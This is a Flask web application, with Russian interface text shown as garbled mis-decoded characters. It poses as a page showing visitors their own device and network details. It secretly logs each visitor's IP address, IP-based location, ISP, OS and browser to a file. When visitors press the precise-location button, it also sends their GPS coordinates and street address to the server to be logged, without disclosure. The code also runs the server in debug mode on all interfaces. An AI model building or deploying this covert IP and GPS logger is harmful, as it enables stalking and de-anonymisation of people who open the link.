from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import re
import json

app = Flask(__name__)

def get_ip_data(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return response.json()
    except:
        return {"error": "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ"}

def parse_user_agent(user_agent):
    os = browser = device = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    
    # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –û–°
    os_patterns = {
        'Windows 11': r'Windows NT 10.0; Win64; x64',
        'Windows 10': r'Windows NT 10.0',
        'Linux': r'Linux',
        'Android': r'Android',
        'iOS': r'iPhone|iPad|iPod',
        'Mac OS X': r'Macintosh'
    }
    
    for name, pattern in os_patterns.items():
        if re.search(pattern, user_agent):
            os = name
            break

    # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞
    browser_patterns = {
        'Chrome': r'Chrome',
        'Firefox': r'Firefox',
        'Safari': r'Safari',
        'Edge': r'Edg'
    }
    
    for name, pattern in browser_patterns.items():
        if re.search(pattern, user_agent):
            browser = name
            break

    # –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent:
        device = "–°–º–∞—Ä—Ç—Ñ–æ–Ω/–ü–ª–∞–Ω—à–µ—Ç"
    else:
        device = "–ö–æ–º–ø—å—é—Ç–µ—Ä"

    return os, browser, device

def log_data(ip, user_agent, geo, os, browser, device, gps_data=None):
    log_entry = f"""
=== –ù–æ–≤—ã–π –≤—Ö–æ–¥ ===
–í—Ä–µ–º—è: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
IP: {ip}
–°—Ç—Ä–∞–Ω–∞: {geo.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}
–ì–æ—Ä–æ–¥: {geo.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}
–ü—Ä–æ–≤–∞–π–¥–µ—Ä: {geo.get('org', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}
–û–°: {os}
–ë—Ä–∞—É–∑–µ—Ä: {browser}
–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {device}
User-Agent: {user_agent}
"""
    if gps_data:
        log_entry += f"""GPS –¥–∞–Ω–Ω—ã–µ:
–®–∏—Ä–æ—Ç–∞: {gps_data.get('lat', '')}
–î–æ–ª–≥–æ—Ç–∞: {gps_data.get('lon', '')}
–¢–æ—á–Ω–æ—Å—Ç—å: {gps_data.get('acc', '')} –º
–ê–¥—Ä–µ—Å: {gps_data.get('address', '')}
"""
    log_entry += "------------------------------------\n"
    
    with open("ips.log", "a", encoding="utf-8") as f:
        f.write(log_entry)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ü–æ–ª–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ</title>
    <style>
        :root {
            --primary: #4285f4;
            --secondary: #34a853;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 15px;
            line-height: 1.6;
            color: #333;
        }
        .info-block {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        h2 {
            color: var(--primary);
            margin-top: 0;
        }
        button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 16px;
            width: 100%;
            cursor: pointer;
            margin: 10px 0;
            transition: background 0.3s;
        }
        button:hover {
            background: #3367d6;
        }
        #map {
            height: 250px;
            width: 100%;
            border-radius: 12px;
            margin-top: 15px;
            border: 1px solid #ddd;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            background: var(--secondary);
            color: white;
            border-radius: 10px;
            font-size: 12px;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
            color: #666;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        @media (max-width: 600px) {
            .grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="info-block">
        <h2>üåê –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h2>
        <div class="grid">
            <div>
                <p><strong>IP –∞–¥—Ä–µ—Å:</strong><br>{{ ip }}</p>
                <p><strong>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</strong><br>{{ isp }}</p>
            </div>
            <div>
                <p><strong>–°—Ç—Ä–∞–Ω–∞:</strong><br>{{ country }}</p>
                <p><strong>–ì–æ—Ä–æ–¥:</strong><br>{{ city }}</p>
            </div>
        </div>
    </div>

    <div class="info-block">
        <h2>üíª –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h2>
        <div class="grid">
            <div>
                <p><strong>–û–°:</strong><br>{{ os }}</p>
                <p><strong>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</strong><br>{{ device }}</p>
            </div>
            <div>
                <p><strong>–ë—Ä–∞—É–∑–µ—Ä:</strong><br>{{ browser }}</p>
                <p><strong>–Ø–¥—Ä–∞ CPU:</strong><br><span id="cpuCores">–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ...</span></p>
            </div>
        </div>
    </div>

    <div class="info-block">
        <h2>üìç –¢–æ—á–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è</h2>
        <button onclick="getPreciseLocation()">–û–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–æ—ë –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ</button>
        <div id="loading" class="loading">
            <p>–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è...</p>
        </div>
        <div id="geoResult" style="display:none;">
            <p><strong>–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:</strong><br>
            –®–∏—Ä–æ—Ç–∞: <span id="latitude"></span><br>
            –î–æ–ª–≥–æ—Ç–∞: <span id="longitude"></span><br>
            –¢–æ—á–Ω–æ—Å—Ç—å: <span id="accuracy" class="badge"></span></p>
            <p><strong>–ê–¥—Ä–µ—Å:</strong><br><span id="address"></span></p>
            <div id="map"></div>
        </div>
    </div>

    <script>
        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —è–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞
        document.getElementById('cpuCores').textContent = 
            navigator.hardwareConcurrency || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";

        // –£–ª—É—á—à–µ–Ω–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è
        function getPreciseLocation() {
            const loading = document.getElementById('loading');
            const geoResult = document.getElementById('geoResult');
            
            loading.style.display = 'block';
            geoResult.style.display = 'none';
            
            if (!navigator.geolocation) {
                alert("–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é");
                loading.style.display = 'none';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = Math.round(position.coords.accuracy);
                    
                    // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç
                    document.getElementById('latitude').textContent = lat.toFixed(6);
                    document.getElementById('longitude').textContent = lon.toFixed(6);
                    document.getElementById('accuracy').textContent = `¬±${acc} –º`;
                    
                    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞
                    const address = await getAddress(lat, lon);
                    document.getElementById('address').textContent = address || "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
                    
                    // –ü–æ–∫–∞–∑–∞—Ç—å –∫–∞—Ä—Ç—É
                    showMap(lat, lon);
                    
                    // –û—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
                    sendToServer(lat, lon, acc, address);
                    
                    loading.style.display = 'none';
                    geoResult.style.display = 'block';
                },
                (error) => {
                    loading.style.display = 'none';
                    handleGeolocationError(error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        async function getAddress(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                const addr = data.address || {};
                return [
                    addr.road, 
                    addr.house_number, 
                    addr.city || addr.town || addr.village
                ].filter(Boolean).join(', ');
            } catch {
                return null;
            }
        }

        function showMap(lat, lon) {
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º OpenStreetMap –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
            document.getElementById('map').innerHTML = `
                <iframe
                    width="100%"
                    height="100%"
                    frameborder="0"
                    scrolling="no"
                    marginheight="0"
                    marginwidth="0"
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&amp;layer=mapnik&amp;marker=${lat}%2C${lon}"
                ></iframe>`;
        }

        function sendToServer(lat, lon, acc, address) {
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö GPS –Ω–∞ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
            fetch('/log_gps', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    lat: lat,
                    lon: lon,
                    acc: acc,
                    address: address
                })
            });
        }

        function handleGeolocationError(error) {
            const messages = {
                1: "–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â—ë–Ω. –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞.",
                2: "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É –∏ GPS.",
                3: "–í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ GPS –≤–∫–ª—é—á—ë–Ω."
            };
            alert(messages[error.code] || "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')
    geo = get_ip_data(ip)
    os, browser, device = parse_user_agent(user_agent)
    
    # –õ–æ–≥–∏—Ä—É–µ–º –±–∞–∑–æ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
    log_data(ip, user_agent, geo, os, browser, device)
    
    return render_template_string(HTML_TEMPLATE,
        ip=ip,
        country=geo.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'),
        city=geo.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'),
        isp=geo.get('org', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'),
        os=os,
        browser=browser,
        device=device
    )

@app.route('/log_gps', methods=['POST'])
def log_gps():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')
    geo = get_ip_data(ip)
    os, browser, device = parse_user_agent(user_agent)
    
    log_data(ip, user_agent, geo, os, browser, device, {
        'lat': data.get('lat'),
        'lon': data.get('lon'),
        'acc': data.get('acc'),
        'address': data.get('address')
    })
    
    return {'status': 'success'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
